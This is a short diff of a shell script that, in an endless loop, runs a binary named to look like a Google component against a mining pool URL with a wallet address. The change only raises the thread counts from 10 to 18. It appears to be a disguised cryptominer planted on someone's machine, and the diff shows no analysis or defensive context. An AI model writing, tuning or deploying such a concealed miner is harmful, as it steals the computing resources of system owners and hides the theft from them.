@@ -10,7 +10,7 @@ cd googleapps8474
 while true
 do
 
-timeout 146 ./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 10 -b 10
+timeout 146 ./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 18 -b 18
 if [ $? -eq 124 ]; then
 echo "google84"
 else
